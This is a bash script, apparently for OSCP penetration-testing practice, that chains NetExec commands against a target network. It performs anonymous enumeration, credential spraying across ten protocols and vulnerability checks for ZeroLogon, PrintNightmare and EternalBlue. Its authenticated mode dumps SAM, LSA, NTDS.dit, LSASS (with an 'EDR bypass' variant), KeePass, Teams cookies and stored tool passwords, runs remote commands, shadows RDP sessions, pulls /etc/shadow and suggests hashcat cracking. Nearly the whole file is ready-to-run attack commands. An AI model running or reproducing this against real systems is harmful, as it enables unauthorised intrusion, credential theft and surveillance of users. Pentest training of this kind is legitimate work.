#!/bin/bash

# nxc-omni.sh V5 - OSCP NetExec Ultimate Automator
# Protocols: SMB, LDAP, WinRM, RDP, MSSQL, SSH, FTP, WMI, NFS, VNC
# Usage:
#   No Auth:       ./nxc-omni.sh -t <target>
#   Single Cred:   ./nxc-omni.sh -t <target> -u <user> -p <pass>
#   Hash PTH:      ./nxc-omni.sh -t <target> -u <user> -H <hash>
#   File Spray:    ./nxc-omni.sh -t <target> -U users.txt -P pass.txt [-c]
#   Continue:      add -c or --continue-on-success

TARGET=""
USER=""
PASS=""
HASH=""
USER_FILE=""
PASS_FILE=""
CONTINUE_FLAG=""

while getopts "t:u:p:H:U:P:c" opt; do
  case $opt in
    t) TARGET="$OPTARG" ;;
    u) USER="$OPTARG" ;;
    p) PASS="$OPTARG" ;;
    H) HASH="$OPTARG" ;;
    U) USER_FILE="$OPTARG" ;;
    P) PASS_FILE="$OPTARG" ;;
    c) CONTINUE_FLAG="--continue-on-success" ;;
    *) echo "Invalid flag"; exit 1 ;;
  esac
done

for arg in "$@"; do
  [[ "$arg" == "--continue-on-success" ]] && CONTINUE_FLAG="--continue-on-success"
done

if [ -z "$TARGET" ]; then
    echo -e "\n[!] Error: Target is required."
    echo -e "Usage: $0 -t 192.168.1.0/24 [-u user] [-p pass | -H hash] [-U users.txt] [-P pass.txt] [-c]\n"
    exit 1
fi

OUTDIR="nxc_results_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$OUTDIR/spider_plus"

# Safe auth arrays (no eval)
AUTH=()
if [ -n "$USER" ] && [ -n "$PASS" ]; then
    AUTH=(-u "$USER" -p "$PASS")
elif [ -n "$USER" ] && [ -n "$HASH" ]; then
    AUTH=(-u "$USER" -H "$HASH")
fi
[ -n "$CONTINUE_FLAG" ] && AUTH+=("$CONTINUE_FLAG")

SPRAY_AUTH=()
if [ -n "$USER_FILE" ] && [ -n "$PASS_FILE" ]; then
    SPRAY_AUTH=(-u "$USER_FILE" -p "$PASS_FILE")
elif [ -n "$USER_FILE" ] && [ -n "$PASS" ]; then
    SPRAY_AUTH=(-u "$USER_FILE" -p "$PASS")
elif [ -n "$USER" ] && [ -n "$PASS_FILE" ]; then
    SPRAY_AUTH=(-u "$USER" -p "$PASS_FILE")
fi
[ -n "$CONTINUE_FLAG" ] && SPRAY_AUTH+=("$CONTINUE_FLAG")

run() {
    local label="$1"
    local outfile="$2"
    shift 2
    echo -e "\n[*] $label"
    echo -e "[CMD] $*\n" | tee -a "$OUTDIR/full_log.txt"
    "$@" 2>&1 | tee "$OUTDIR/$outfile" | tee -a "$OUTDIR/full_log.txt" \
        || echo -e "[!] Failed/no results: $label"
}

echo -e "\n======================================================="
echo -e "   OSCP NXC OMNI-ENUMERATOR V5 — $(date)"
echo -e "   Output: ./$OUTDIR/"
echo -e "=======================================================\n"
[ -n "$CONTINUE_FLAG" ] && echo -e "[+] --continue-on-success: ENABLED\n"

#####################################################################
# MODE 1: UNAUTHENTICATED / NULL / GUEST
#####################################################################
if [ -z "$USER" ] && [ -z "$USER_FILE" ]; then
    echo -e "[!] MODE: UNAUTHENTICATED / NULL / GUEST\n"

    ## ── SMB ──────────────────────────────────────────────────────
    run "SMB: Host Sweep (OS / Domain / Signing / Version)" \
        smb_sweep.txt \
        nxc smb "$TARGET"

    run "SMB: Relay Target List (Signing Disabled)" \
        smb_relay_targets.txt \
        nxc smb "$TARGET" --gen-relay-list "$OUTDIR/relay_targets.txt"

    run "SMB: Null Session — Shares" \
        smb_null_shares.txt \
        nxc smb "$TARGET" -u '' -p '' --shares

    run "SMB: Null Session — Users" \
        smb_null_users.txt \
        nxc smb "$TARGET" -u '' -p '' --users

    run "SMB: Null Session — Groups" \
        smb_null_groups.txt \
        nxc smb "$TARGET" -u '' -p '' --groups

    run "SMB: Null Session — Password Policy" \
        smb_null_passpol.txt \
        nxc smb "$TARGET" -u '' -p '' --pass-pol

    run "SMB: Null Session — Disks" \
        smb_null_disks.txt \
        nxc smb "$TARGET" -u '' -p '' --disks

    run "SMB: Null Session — Network Interfaces" \
        smb_null_interfaces.txt \
        nxc smb "$TARGET" -u '' -p '' --interfaces

    run "SMB: Guest Logon — Shares + Users" \
        smb_guest.txt \
        nxc smb "$TARGET" -u 'guest' -p '' --shares --users

    run "SMB: RID Brute via Null Session" \
        smb_rid_null.txt \
        nxc smb "$TARGET" -u '' -p '' --rid-brute

    run "SMB: RID Brute via Guest" \
        smb_rid_guest.txt \
        nxc smb "$TARGET" -u 'guest' -p '' --rid-brute

    ## ── VULN SCANS (no creds) ────────────────────────────────────
    run "VULN: ZeroLogon (CVE-2020-1472)" \
        vuln_zerologon.txt \
        nxc smb "$TARGET" -u '' -p '' -M zerologon

    run "VULN: PrintNightmare (CVE-2021-1675)" \
        vuln_printnightmare.txt \
        nxc smb "$TARGET" -u '' -p '' -M printnightmare

    run "VULN: SMBGhost (CVE-2020-0796)" \
        vuln_smbghost.txt \
        nxc smb "$TARGET" -u '' -p '' -M smbghost

    run "VULN: MS17-010 EternalBlue" \
        vuln_ms17010.txt \
        nxc smb "$TARGET" -u '' -p '' -M ms17-010

    run "VULN: Coerce (PetitPotam / DFSCoerce / ShadowCoerce)" \
        vuln_coerce.txt \
        nxc smb "$TARGET" -u '' -p '' -M coerce_plus

    ## ── LDAP ─────────────────────────────────────────────────────
    run "LDAP: Anonymous Bind" \
        ldap_anon.txt \
        nxc ldap "$TARGET" -u '' -p ''

    run "LDAP: LDAP Signing Check" \
        ldap_signing.txt \
        nxc ldap "$TARGET" -u '' -p '' -M ldap-checker

    run "LDAP: Find Domain SID" \
        ldap_sid.txt \
        nxc ldap "$TARGET" -u '' -p '' --get-sid

    run "LDAP: AS-REP Roast (No Auth)" \
        ldap_asrep_noauth.txt \
        nxc ldap "$TARGET" -u '' -p '' --asreproast "$OUTDIR/asrep_noauth_hashes.txt"

    ## ── RDP ──────────────────────────────────────────────────────
    run "RDP: Host Sweep + NLA Check" \
        rdp_sweep.txt \
        nxc rdp "$TARGET"

    run "RDP: Screenshot Without NLA (login page)" \
        rdp_nla_screenshot.txt \
        nxc rdp "$TARGET" --nla-screenshot

    ## ── FTP ──────────────────────────────────────────────────────
    run "FTP: Anonymous Login" \
        ftp_anon.txt \
        nxc ftp "$TARGET" -u 'anonymous' -p 'anonymous'

    ## ── NFS ──────────────────────────────────────────────────────
    run "NFS: Detect + Version + Root Escape Check" \
        nfs_detect.txt \
        nxc nfs "$TARGET"

    run "NFS: Enumerate Shares (UID/Perms/Access List)" \
        nfs_shares.txt \
        nxc nfs "$TARGET" --shares

    run "NFS: List Root FS (if root escape available)" \
        nfs_ls_root.txt \
        nxc nfs "$TARGET" --ls '/'

    run "NFS: Recursive Share Enum (depth 5)" \
        nfs_enum_shares.txt \
        nxc nfs "$TARGET" --enum-shares 5

    ## ── VNC ──────────────────────────────────────────────────────
    run "VNC: Authentication Check (No Auth)" \
        vnc_check.txt \
        nxc vnc "$TARGET"

    ## ── RPC ──────────────────────────────────────────────────────
    run "RPC: Anonymous Enumeration" \
        rpc_anon.txt \
        nxc rpc "$TARGET" -u '' -p '' --enum

#####################################################################
# MODE 2: FILE-BASED CREDENTIAL SPRAY
#####################################################################
elif [ ${#SPRAY_AUTH[@]} -gt 0 ]; then
    echo -e "[!] MODE: CREDENTIAL SPRAY (File-based)\n"
    [ -n "$USER_FILE" ] && echo -e "[+] User file  : $USER_FILE"
    [ -n "$PASS_FILE" ] && echo -e "[+] Pass file  : $PASS_FILE"
    [ -n "$PASS" ]      && echo -e "[+] Password   : $PASS"
    [ -n "$CONTINUE_FLAG" ] && echo -e "[+] continue-on-success: ON\n"

    run "SMB: Credential Spray" \
        spray_smb.txt \
        nxc smb "$TARGET" "${SPRAY_AUTH[@]}"

    run "SMB: Credential Spray (Local Auth)" \
        spray_smb_local.txt \
        nxc smb "$TARGET" "${SPRAY_AUTH[@]}" --local-auth

    run "WinRM: Credential Spray" \
        spray_winrm.txt \
        nxc winrm "$TARGET" "${SPRAY_AUTH[@]}"

    run "RDP: Credential Spray (--no-bruteforce for 1:1 pairs)" \
        spray_rdp.txt \
        nxc rdp "$TARGET" "${SPRAY_AUTH[@]}"

    run "MSSQL: Credential Spray" \
        spray_mssql.txt \
        nxc mssql "$TARGET" "${SPRAY_AUTH[@]}"

    run "SSH: Credential Spray" \
        spray_ssh.txt \
        nxc ssh "$TARGET" "${SPRAY_AUTH[@]}"

    run "FTP: Credential Spray" \
        spray_ftp.txt \
        nxc ftp "$TARGET" "${SPRAY_AUTH[@]}"

    run "LDAP: Credential Spray" \
        spray_ldap.txt \
        nxc ldap "$TARGET" "${SPRAY_AUTH[@]}"

    run "WMI: Credential Spray" \
        spray_wmi.txt \
        nxc wmi "$TARGET" "${SPRAY_AUTH[@]}"

    run "VNC: Credential Spray" \
        spray_vnc.txt \
        nxc vnc "$TARGET" "${SPRAY_AUTH[@]}"

    echo -e "\n[+] Spray done. grep '\[+\]' spray_*.txt for valid hits."
    echo -e "[+] Look for '(Pwn3d!)' = local admin access.\n"

#####################################################################
# MODE 3: FULL AUTHENTICATED ENUMERATION
#####################################################################
else
    echo -e "[!] MODE: AUTHENTICATED FULL ENUMERATION\n"
    echo -e "[+] User: $USER\n"

    ## ── SMB: ENUMERATION ─────────────────────────────────────────
    run "SMB: Shares + Pwn3d! (Local Admin) Check" \
        smb_shares.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --shares

    run "SMB: Local Auth Shares (Workgroup/Non-Domain)" \
        smb_local_auth.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --local-auth --shares

    run "SMB: Domain Users" \
        smb_users.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --users

    run "SMB: Domain Groups" \
        smb_groups.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --groups

    run "SMB: Local Groups" \
        smb_local_groups.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --local-groups

    run "SMB: Password Policy" \
        smb_passpol.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --pass-pol

    run "SMB: Logged-on Users + Active Sessions" \
        smb_sessions.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --sessions --loggedon-users

    run "SMB: qwinsta (Interactive RDP Sessions — needed for impersonation)" \
        smb_qwinsta.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --qwinsta

    run "SMB: Disks" \
        smb_disks.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --disks

    run "SMB: Network Interfaces" \
        smb_interfaces.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --interfaces

    run "SMB: RID Brute (Full User List)" \
        smb_rid.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --rid-brute

    run "SMB: Running Processes (tasklist)" \
        smb_processes.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --processes

    run "SMB: Recently Accessed Files (LNK)" \
        smb_lnk.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M get-lnk-files

    run "SMB: Enumerate AV / EDR" \
        smb_av_edr.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M enum_av

    run "SMB: Spooler + WebDAV Running" \
        smb_spooler_webdav.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M spooler -M webdav

    run "SMB: Enumerate NTLMv1" \
        smb_ntlmv1.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M ntlmv1

    run "SMB: Enumerate Bitlocker Status" \
        smb_bitlocker.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M bitlocker

    run "SMB: List Share Directories (--dir)" \
        smb_dir.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --dir

    run "SMB: SpiderPlus (All Readable Files JSON Map)" \
        smb_spider.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M spider_plus -o OUTPUT_FOLDER="$OUTDIR/spider_plus"

    run "SMB: GPP Passwords (SYSVOL)" \
        smb_gpp_pass.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M gpp_password

    run "SMB: GPP AutoLogin" \
        smb_gpp_autologin.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M gpp_autologin

    ## ── SMB: CREDENTIAL DUMPING ──────────────────────────────────
    run "DUMP: SAM (Local Hashes)" \
        dump_sam.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --sam

    run "DUMP: LSA Secrets" \
        dump_lsa.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --lsa

    run "DUMP: NTDS.dit (DC Only — Domain Admin needed)" \
        dump_ntds.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --ntds

    run "DUMP: LSASS — lsassy (primary)" \
        dump_lsassy.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M lsassy

    run "DUMP: LSASS — nanodump (EDR bypass alt)" \
        dump_nanodump.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M nanodump

    run "DUMP: LSASS — procdump (alt)" \
        dump_procdump.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M procdump

    run "DUMP: LSASS — handlekatz (handle-based)" \
        dump_handlekatz.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M handlekatz

    run "DUMP: DPAPI Secrets" \
        dump_dpapi.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M dpapi

    run "DUMP: KeePass — Discover" \
        dump_keepass_discover.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M keepass_discover

    run "DUMP: KeePass — Trigger (extract master key)" \
        dump_keepass_trigger.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M keepass_trigger

    run "DUMP: WiFi Passwords" \
        dump_wifi.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M wireless

    run "DUMP: WinSCP Credentials" \
        dump_winscp.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M winscp

    run "DUMP: PuTTY Sessions" \
        dump_putty.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M putty

    run "DUMP: VNC Passwords (RealVNC / TightVNC)" \
        dump_vnc.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M vnc

    run "DUMP: mRemoteNG Credentials" \
        dump_mremoteng.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M mremoteng

    run "DUMP: MobaXterm Credentials" \
        dump_mobaxterm.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M mobaxterm

    run "DUMP: RDCMan (Remote Desktop Credential Manager)" \
        dump_rdcman.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M rdcman

    run "DUMP: Microsoft Teams Cookies" \
        dump_teams.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M teams_localdb

    run "DUMP: Notepad++ Unsaved Content" \
        dump_notepadpp.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M notepadplusplus

    run "DUMP: Veeam Backup Credentials" \
        dump_veeam.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M veeam

    run "DUMP: SCCM Credentials" \
        dump_sccm.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M sccm

    run "DUMP: Backup Operator (SAM/SECURITY of DC)" \
        dump_backup_operator.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M backup_operator

    ## ── VULN SCANNING ────────────────────────────────────────────
    run "VULN: noPAC (CVE-2021-42278/42287)" \
        vuln_nopac.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M nopac

    run "VULN: ZeroLogon (no creds needed)" \
        vuln_zerologon.txt \
        nxc smb "$TARGET" -u '' -p '' -M zerologon

    run "VULN: PrintNightmare (no creds needed)" \
        vuln_printnightmare.txt \
        nxc smb "$TARGET" -u '' -p '' -M printnightmare

    run "VULN: MS17-010 EternalBlue (no creds needed)" \
        vuln_ms17010.txt \
        nxc smb "$TARGET" -u '' -p '' -M ms17-010

    run "VULN: NTLM Reflection (CVE-2025-33073)" \
        vuln_ntlm_reflection.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M ntlm_reflection

    run "VULN: Coerce (PetitPotam / DFSCoerce / ShadowCoerce)" \
        vuln_coerce.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M coerce_plus

    ## ── WinRM ────────────────────────────────────────────────────
    run "WinRM: Auth Check + Shell Access (Pwn3d!)" \
        winrm_auth.txt \
        nxc winrm "$TARGET" "${AUTH[@]}"

    run "WinRM: Command Execution (whoami)" \
        winrm_exec.txt \
        nxc winrm "$TARGET" "${AUTH[@]}" -X 'whoami /all'

    run "WinRM: Dump SAM via WinRM" \
        winrm_dump_sam.txt \
        nxc winrm "$TARGET" "${AUTH[@]}" --sam

    run "WinRM: Dump LSA via WinRM" \
        winrm_dump_lsa.txt \
        nxc winrm "$TARGET" "${AUTH[@]}" --lsa

    run "WinRM: lsassy via WinRM" \
        winrm_lsassy.txt \
        nxc winrm "$TARGET" "${AUTH[@]}" -M lsassy

    ## ── RDP ──────────────────────────────────────────────────────
    run "RDP: Auth Check (Pwn3d!)" \
        rdp_auth.txt \
        nxc rdp "$TARGET" "${AUTH[@]}"

    run "RDP: Screenshot (Connected Session)" \
        rdp_screenshot.txt \
        nxc rdp "$TARGET" "${AUTH[@]}" --screenshot

    run "RDP: Screenshot Without NLA (login page)" \
        rdp_nla_screenshot.txt \
        nxc rdp "$TARGET" --nla-screenshot

    run "RDP: Command Execution via RDP (beta)" \
        rdp_exec.txt \
        nxc rdp "$TARGET" "${AUTH[@]}" -x 'whoami'

    run "RDP: Shadow RDP (eavesdrop on session)" \
        rdp_shadow.txt \
        nxc smb "$TARGET" "${AUTH[@]}" -M shadowrdp

    run "RDP: qwinsta (Enumerate Active RDP Sessions)" \
        rdp_qwinsta.txt \
        nxc smb "$TARGET" "${AUTH[@]}" --qwinsta

    ## ── LDAP ─────────────────────────────────────────────────────
    run "LDAP: BloodHound Full Ingest" \
        ldap_bloodhound.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --bloodhound -c All

    run "LDAP: Domain Users" \
        ldap_users.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --users

    run "LDAP: Domain Groups" \
        ldap_groups.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --groups

    run "LDAP: Admin Count (AdminCount=1 — Privileged)" \
        ldap_admincount.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --admin-count

    run "LDAP: Machine Account Quota (MAQ)" \
        ldap_maq.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M maq

    run "LDAP: LAPS Passwords" \
        ldap_laps.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M laps

    run "LDAP: AS-REP Roastable Users" \
        ldap_asrep.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --asreproast "$OUTDIR/asrep_hashes.txt"

    run "LDAP: Kerberoastable Service Accounts" \
        ldap_kerb.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --kerberoasting "$OUTDIR/kerb_hashes.txt"

    run "LDAP: User Description Password Mining" \
        ldap_desc.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M get-desc-users

    run "LDAP: Delegation (Unconstrained + Constrained)" \
        ldap_delegation.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --trusted-for-delegation

    run "LDAP: Find Misconfigured Delegation" \
        ldap_deleg_misconfig.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --find-delegation

    run "LDAP: DACL / ACL Abuse Paths" \
        ldap_dacl.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M daclread

    run "LDAP: gMSA Accounts + Secrets" \
        ldap_gmsa.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --gmsa

    run "LDAP: Pre2k Computer Account Abuse" \
        ldap_pre2k.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M pre2k

    run "LDAP: Extract Subnets" \
        ldap_subnets.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M get-network

    run "LDAP: Domain Trust / DC List" \
        ldap_trusts.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --dc-list

    run "LDAP: ADCS — Find Certificate Templates (ESC1-8)" \
        ldap_adcs.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M adcs

    run "LDAP: Password Settings Objects (PSO / Fine-Grained Policy)" \
        ldap_pso.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --pso

    run "LDAP: SCCM Enumeration" \
        ldap_sccm.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M sccm

    run "LDAP: LDAP Signing + Channel Binding Status" \
        ldap_signing.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" -M ldap-checker

    run "LDAP: Dump PSO (Fine-Grained Password Policy)" \
        ldap_dump_pso.txt \
        nxc ldap "$TARGET" "${AUTH[@]}" --pso

    ## ── MSSQL ────────────────────────────────────────────────────
    run "MSSQL: Auth + Version Check" \
        mssql_auth.txt \
        nxc mssql "$TARGET" "${AUTH[@]}" -q 'SELECT @@version'

    run "MSSQL: PrivEsc Check (xp_cmdshell / impersonation)" \
        mssql_priv.txt \
        nxc mssql "$TARGET" "${AUTH[@]}" -M mssql_priv

    run "MSSQL: Command Execution via xp_cmdshell" \
        mssql_exec.txt \
        nxc mssql "$TARGET" "${AUTH[@]}" -x 'whoami'

    run "MSSQL: RID Brute" \
        mssql_rid.txt \
        nxc mssql "$TARGET" "${AUTH[@]}" --rid-brute

    run "MSSQL: Enum Impersonation (users you can impersonate)" \
        mssql_impersonate.txt \
        nxc mssql "$TARGET" "${AUTH[@]}" -M enum_impersonate

    run "MSSQL: Linked Servers Enumeration" \
        mssql_linked.txt \
        nxc mssql "$TARGET" "${AUTH[@]}" -M mssql_linked

    run "MSSQL: Coerce via MSSQL" \
        mssql_coerce.txt \
        nxc mssql "$TARGET" "${AUTH[@]}" -M mssql_coerce

    ## ── WMI ──────────────────────────────────────────────────────
    run "WMI: Auth Check" \
        wmi_auth.txt \
        nxc wmi "$TARGET" "${AUTH[@]}"

    run "WMI: Command Execution (whoami)" \
        wmi_exec.txt \
        nxc wmi "$TARGET" "${AUTH[@]}" -x 'whoami'

    ## ── SSH ──────────────────────────────────────────────────────
    run "SSH: Auth Check" \
        ssh_auth.txt \
        nxc ssh "$TARGET" "${AUTH[@]}"

    run "SSH: Command Execution (id)" \
        ssh_exec.txt \
        nxc ssh "$TARGET" "${AUTH[@]}" -x 'id'

    ## ── FTP ──────────────────────────────────────────────────────
    run "FTP: Auth Check + File Listing" \
        ftp_auth.txt \
        nxc ftp "$TARGET" "${AUTH[@]}"

    ## ── NFS ──────────────────────────────────────────────────────
    run "NFS: Detect + Version + Root Escape Check" \
        nfs_detect.txt \
        nxc nfs "$TARGET"

    run "NFS: Enumerate Shares" \
        nfs_shares.txt \
        nxc nfs "$TARGET" --shares

    run "NFS: List Files (Root FS Escape if available)" \
        nfs_ls.txt \
        nxc nfs "$TARGET" --ls '/'

    run "NFS: Download /etc/shadow (if root escape)" \
        nfs_shadow.txt \
        nxc nfs "$TARGET" --share '/' --get '/etc/shadow'

    run "NFS: Recursive Enum (depth 5)" \
        nfs_enum.txt \
        nxc nfs "$TARGET" --enum-shares 5

    ## ── VNC ──────────────────────────────────────────────────────
    run "VNC: Auth Check" \
        vnc_auth.txt \
        nxc vnc "$TARGET" "${AUTH[@]}"

    echo -e "\n[+] =================== SUMMARY ===================="
    echo -e "[+] Output dir:        ./$OUTDIR/"
    echo -e "[+] BloodHound JSONs:  ./$OUTDIR/ → import to BloodHound"
    echo -e "[+] SpiderPlus map:    ./$OUTDIR/spider_plus/"
    echo -e "[+] Relay targets:     ./$OUTDIR/relay_targets.txt"
    echo -e "[+] AS-REP hashes:     ./$OUTDIR/asrep_hashes.txt"
    echo -e "[+] Kerberoast hashes: ./$OUTDIR/kerb_hashes.txt"
    echo -e "[+] Full log:          ./$OUTDIR/full_log.txt"
    echo -e "[+] =================================================\n"
    echo -e "[TIP] hashcat -m 18200 asrep_hashes.txt rockyou.txt"
    echo -e "[TIP] hashcat -m 13100 kerb_hashes.txt rockyou.txt\n"
fi

echo -e "=======================================================\n"
